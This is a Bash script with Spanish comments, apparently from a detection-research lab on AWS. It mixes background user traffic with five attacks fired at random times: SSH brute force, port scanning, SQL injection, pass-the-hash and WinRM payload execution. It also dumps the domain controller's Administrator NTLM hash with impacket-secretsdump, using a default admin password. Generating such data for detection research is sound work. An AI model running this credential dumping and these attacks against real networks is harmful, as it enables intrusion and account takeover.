#!/usr/bin/env bash
# Escenario 3: Eventos mixtos — trafico normal + ataques en momentos aleatorios.
#
# Metodologia (Fase 3 del proyecto): combina el trafico normal del Escenario 1
# con los 5 ataques del Escenario 2, lanzados en instantes aleatorios dentro de
# la misma ventana, manteniendo el trafico de fondo continuo. Esto emula una
# situacion mas realista donde el trafico malicioso se oculta entre actividad
# legitima.
#
# Diseño para AWS: se ejecuta EN LA ESTACION ATACANTE (tiene las herramientas
# de ataque y las credenciales), y lanza el trafico de fondo POR SSH en la
# estacion de usuario real (linux-01), para no mezclar la IP origen del
# "usuario normal" con la del "atacante" — mantiene la separacion metodologica
# correcta para la correlacion posterior.
#
# Uso: ./escenario3_mixto.sh <DURACION_MIN>
#   (requiere: source ~/lab.env primero, igual que run_all_attacks.sh)
set -uo pipefail
cd "$(dirname "$0")"
export ESCENARIO=3

DURACION_MIN="${1:-40}"
LINUX_WS_HOST="${LINUX_WS_SSH:-ubuntu@${LINUX_WS_PUBLIC_IP:-}}"
BASELINE_SCRIPT_REMOTE="/opt/lab/escenarios/escenario1_linea_base.sh"

DC_IP="${DC_IP:?Falta DC_IP (source ~/lab.env)}"
WEB_URL="${WEB_URL:?Falta WEB_URL}"
WIN_WS_IP="${WIN_WS_IP:?Falta WIN_WS_IP}"
SSH_TARGET="${SSH_TARGET:?Falta SSH_TARGET}"
SSH_USER="${SSH_USER:-usuario}"
DOMAIN_ADMIN="${DOMAIN_ADMIN:-EMPRESA/Administrator}"
DOMAIN_ADMIN_PASS="${DOMAIN_ADMIN_PASS:-P@ssw0rd}"

echo "[+] Escenario 3 (mixto) — duracion ${DURACION_MIN} min — $(date -u +%FT%TZ)"

# --- 1. Trafico de fondo continuo (en la estacion de usuario real) ----------
# SKIP_BASELINE=1 => el trafico de fondo lo orquesta el operador por fuera
# (p.ej. desde la IP de administracion, que SI tiene acceso SSH a linux-01;
# el atacante NO puede alcanzar la IP publica de linux-01 porque el security
# group solo abre SSH a la IP de admin). Esta es la via correcta en AWS:
# el tráfico normal se genera desde la estacion de usuario real y los ataques
# desde el atacante, en paralelo.
BG_LOCAL_PID=""
if [ "${SKIP_BASELINE:-0}" = "1" ]; then
  echo "[+] (SKIP_BASELINE=1) El trafico de fondo lo gestiona el operador externamente."
elif [ -n "${LINUX_WS_PUBLIC_IP:-}" ]; then
  echo "[+] Lanzando trafico normal de fondo en linux-01 (${LINUX_WS_PUBLIC_IP})..."
  ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 \
      -o ServerAliveInterval=30 -o ServerAliveCountMax=20 \
      "ubuntu@${LINUX_WS_PUBLIC_IP}" \
      "sudo bash ${BASELINE_SCRIPT_REMOTE} ${DURACION_MIN} > /tmp/escenario3_baseline.log 2>&1" &
  BG_LOCAL_PID=$!
else
  echo "[!] LINUX_WS_PUBLIC_IP no definido; genero trafico de fondo localmente (menos realista)."
  ./escenario1_linea_base.sh "${DURACION_MIN}" > /tmp/escenario3_baseline_local.log 2>&1 &
  BG_LOCAL_PID=$!
fi

# --- 2. Obtener una vez el hash NTLM real (para pass-the-hash) --------------
NTHASH=""
if command -v impacket-secretsdump &>/dev/null; then
  echo "[+] Capturando hash NTLM del DC (secretsdump) para Pass-the-Hash..."
  # Dual-stack: con DC IPv6, Impacket requiere -target-ip + nombre del DC.
  SD_TIP=(); SD_HOST="${DC_IP}"
  case "$DC_IP" in *:*) SD_TIP=(-target-ip "$DC_IP"); SD_HOST="dc-empresa";; esac
  OUT="$(impacket-secretsdump "${SD_TIP[@]}" "${DOMAIN_ADMIN%/*}/Administrator:${DOMAIN_ADMIN_PASS}@${SD_HOST}" 2>/dev/null || true)"
  NTHASH="$(echo "$OUT" | grep -m1 '^Administrator:500:' | cut -d: -f4)"
fi

# --- 3. Disparar los 5 tipos de ataque en instantes aleatorios ---------------
FIN=$(( $(date +%s) + DURACION_MIN*60 ))
ATAQUES_DISPARADOS=0

lanzar_ataque_aleatorio() {
  local n=$(( RANDOM % 5 ))
  case "$n" in
    0) echo "[+] ($(date -u +%FT%TZ)) Disparando: fuerza bruta SSH"
       ./../ataques/attack1_bruteforce_ssh.sh "${SSH_TARGET}" "${SSH_USER}" ;;
    1) echo "[+] ($(date -u +%FT%TZ)) Disparando: escaneo de puertos"
       ./../ataques/attack2_portscan.sh "${DC_IP}" ;;
    2) echo "[+] ($(date -u +%FT%TZ)) Disparando: inyeccion SQL"
       ./../ataques/attack4_sqli.sh "${WEB_URL}" ;;
    3) if [ -n "${NTHASH}" ]; then
         echo "[+] ($(date -u +%FT%TZ)) Disparando: Pass-the-Hash"
         ./../ataques/attack3_pass_the_hash.sh "${DC_IP}" Administrator "${NTHASH}"
       else
         echo "[!] Sin hash NTLM disponible; omito Pass-the-Hash esta vez."
       fi ;;
    4) echo "[+] ($(date -u +%FT%TZ)) Disparando: ejecucion de payload (WinRM)"
       { echo "${DOMAIN_ADMIN}"; echo "${DOMAIN_ADMIN_PASS}"; } | \
         ./../ataques/attack5_payload_exec.sh "${WIN_WS_IP}" ;;
  esac
  ATAQUES_DISPARADOS=$((ATAQUES_DISPARADOS + 1))
}

while [ "$(date +%s)" -lt "${FIN}" ]; do
  ESPERA=$(( (RANDOM % 240) + 60 ))  # entre 1 y 5 min
  RESTANTE=$(( FIN - $(date +%s) ))
  [ "${RESTANTE}" -le 0 ] && break
  [ "${ESPERA}" -gt "${RESTANTE}" ] && ESPERA="${RESTANTE}"
  sleep "${ESPERA}"
  [ "$(date +%s)" -ge "${FIN}" ] && break
  lanzar_ataque_aleatorio
done

echo "[+] Esperando a que termine el trafico de fondo..."
wait "${BG_LOCAL_PID}" 2>/dev/null || true
echo "[+] Escenario mixto finalizado ($(date -u +%FT%TZ)). Ataques disparados: ${ATAQUES_DISPARADOS}"
